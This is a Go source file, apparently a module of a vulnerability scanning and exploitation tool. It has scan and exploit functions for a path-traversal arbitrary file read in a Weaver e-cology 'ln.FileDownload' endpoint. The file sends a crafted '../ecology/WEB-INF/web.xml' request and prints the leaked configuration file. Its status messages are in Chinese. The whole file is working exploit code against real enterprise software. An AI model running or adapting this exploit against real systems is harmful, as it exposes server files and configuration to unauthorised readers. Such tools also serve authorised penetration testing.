package vulners

import (
	"github.com/fatih/color"
	"strings"
)

type Wc12 struct {
}

func (s *Wc12) Scan(targetUrl string) {
	vulnerable, err := Wc12scancore(targetUrl)
	if err != nil {
		color.Red("[x]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Wc12] 存在FileDownload 任意文件读取")
	} else {
		color.White("[Wc12] 不存在FileDownload 任意文件读取")
	}
}

func (*Wc12) Exploit(targetUrl string) {
	runResult, err := Wc12runcore(targetUrl)
	if err != nil {
		color.Red("[x]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.Green(runResult)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Wc12scancore(targetUrl string) (bool, error) {
	url := "/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml"
	resp, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + url)
	if err != nil {
		return false, err
	}
	resContent := resp.String()
	if strings.Contains(resContent, "version") {
		return true, nil
	} else {
		return false, nil
	}
}

func Wc12runcore(targetUrl string) (string, error) {
	url := "/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml"
	resp, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + url)
	if err != nil {
		return "", err
	}
	resContent := resp.String()

	if strings.Contains(resContent, "key") {
		return "存在FileDownload 任意文件读取\n" + resContent, nil
	} else {
		return "", nil
	}
}
